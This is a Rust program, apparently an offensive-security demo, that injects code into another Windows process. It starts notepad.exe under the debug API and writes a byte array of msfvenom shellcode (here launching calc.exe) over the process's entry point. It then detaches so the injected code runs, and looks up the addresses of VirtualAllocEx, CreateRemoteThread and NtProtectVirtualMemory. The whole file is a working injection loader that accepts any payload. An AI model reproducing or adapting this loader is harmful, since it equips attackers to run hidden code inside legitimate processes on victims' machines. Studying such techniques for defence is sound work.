use std::{ffi::c_void, mem::size_of};
use widestring::U16CString;
use windows::{
    core::{s, PWSTR},
    Win32::{
        Foundation::{DBG_CONTINUE, EXCEPTION_BREAKPOINT, HANDLE},
        System::{
            Diagnostics::Debug::*,
            Threading::*,
        },
    },
};

fn main() -> Result<(), Box<dyn std::error::Error>> {

    // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
    let shellcode: [u8; 276] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];

    let mut process_information = PROCESS_INFORMATION::default();
    let mut debug_info = DEBUG_EVENT::default();
    let mut startup_info = STARTUPINFOW::default();
    startup_info.cb = size_of::<STARTUPINFOW>() as u32;
    let path_name = U16CString::from_str("C:\\Windows\\System32\\notepad.exe")?;

    unsafe {
        CreateProcessW(
            None,
            PWSTR(path_name.as_ptr() as _),
            None,
            None,
            false,
            DEBUG_ONLY_THIS_PROCESS,
            None,
            None,
            &startup_info,
            &mut process_information,
        ).map_err(|e| format!("[!] CreateProcessW Failed With Status: {e}"))?;

        for num in 0..7 {
            if WaitForDebugEvent(&mut debug_info, 5000).is_ok() {
                
                match debug_info.dwDebugEventCode {
                    CREATE_PROCESS_DEBUG_EVENT => {
                        println!("[+] Process PID: {}", debug_info.dwProcessId);
                        println!("[+] Thread TID: {}", debug_info.dwThreadId);
                        println!("[+] StartAddress: {:?}", debug_info.u.CreateProcessInfo.lpStartAddress);
                        println!("[+] Process Main Thread: {:?}",debug_info.u.CreateProcessInfo.hThread);
                    },
                    
                    CREATE_THREAD_DEBUG_EVENT => {
                        println!("\n[+] Thread Created: {:?}", debug_info.u.CreateThread.lpStartAddress);
                        println!("[+] Thread HANDLE: {:?}", debug_info.u.CreateThread.hThread);
                        println!("[+] Thread ThreadLocalBase: {:?}", debug_info.u.CreateThread.lpThreadLocalBase);
                    },
                    
                    LOAD_DLL_DEBUG_EVENT => {
                        let mut buffer = [0u8; size_of::<usize>()];
                        let mut return_number = 0;
                        if ReadProcessMemory(
                            process_information.hProcess, 
                            debug_info.u.LoadDll.lpImageName, 
                            buffer.as_mut_ptr() as _, 
                            size_of::<usize>(), 
                            Some(&mut return_number)
                        ).is_ok() {

                            let dll_address = usize::from_ne_bytes(buffer) as *mut c_void;
                            let mut image_name = vec![0u16; 260];
                            println!("\n[+] DLL ADDRESS: {:?}", dll_address);
                            
                            if ReadProcessMemory(
                                process_information.hProcess, 
                                dll_address, 
                                image_name.as_mut_ptr() as _, 
                                image_name.len(), 
                                Some(&mut return_number)
                            ).is_ok() {

                                if let Some(first_null) = image_name.iter().position(|&c| c == 0) {
                                    image_name.truncate(first_null);
                                }

                                let dll_name = String::from_utf16_lossy(&image_name);
                                println!("[+] DLL Name: {}", dll_name.trim_end_matches('\0'));
                            }
                        }

                        println!("[+] DLL Base Address: {:?}", debug_info.u.LoadDll.lpBaseOfDll);
                        println!("[+] DLL H_File: {:?}", debug_info.u.LoadDll.hFile);
                    },
                    
                    EXCEPTION_DEBUG_EVENT => {
                        if debug_info.u.Exception.ExceptionRecord.ExceptionCode== EXCEPTION_BREAKPOINT {
                            println!("[+] Breakpoint was successfully triggered");
                        }
                    },
                    _ => {}
                }

                if num == 6 {
                    let mut number_of_write = 0;
                    WriteProcessMemory(
                        process_information.hProcess,
                        std::mem::transmute::<_, *mut c_void>(debug_info.u.CreateProcessInfo.lpStartAddress),
                        shellcode.as_ptr() as _,
                        shellcode.len(),
                        Some(&mut number_of_write),
                    ).map_err(|e| format!("[!] WriteProcessMemory Failed With Status: {e}"))?;

                    DebugActiveProcessStop(process_information.dwProcessId).map_err(|e| format!("[!] DebugActiveProcessStop Failed With Status: {e}"))?;
                }
            }

            if num < 6 {
                ContinueDebugEvent(
                    process_information.dwProcessId,
                    process_information.dwThreadId,
                    DBG_CONTINUE,
                ).map_err(|e| format!("[!] ContinueDebugEvent Failed With Status: {e}"))?;
            }
        }

        SymInitialize(HANDLE(0xffffffffffffffffu64 as _), None, true).expect("[!] SymInitialize Failed With Status");
        
        let mut symbol = SYMBOL_INFO::default();
        symbol.SizeOfStruct = size_of::<SYMBOL_INFO>() as u32;

        SymFromName(HANDLE(0xffffffffffffffffu64 as _), s!("VirtualAllocEx"), &mut symbol).expect("[!] SymFromName Failed With Status ");
        println!("\n[+] Example Address VirtualAllocEx: {:?}", symbol.Address as *mut c_void);
        
        SymFromName(HANDLE(0xffffffffffffffffu64 as _), s!("CreateRemoteThread"), &mut symbol).expect("[!] SymFromName Failed With Status ");
        println!("[+] Example Address CreateRemoteThread: {:?}", symbol.Address as *mut c_void);

        SymFromName(HANDLE(0xffffffffffffffffu64 as _), s!("NtProtectVirtualMemory"), &mut symbol).expect("[!] SymFromName Failed With Status ");
        println!("[+] Example Address NtProtectVirtualMemory: {:?}", symbol.Address as *mut c_void);
    };

    Ok(())
}
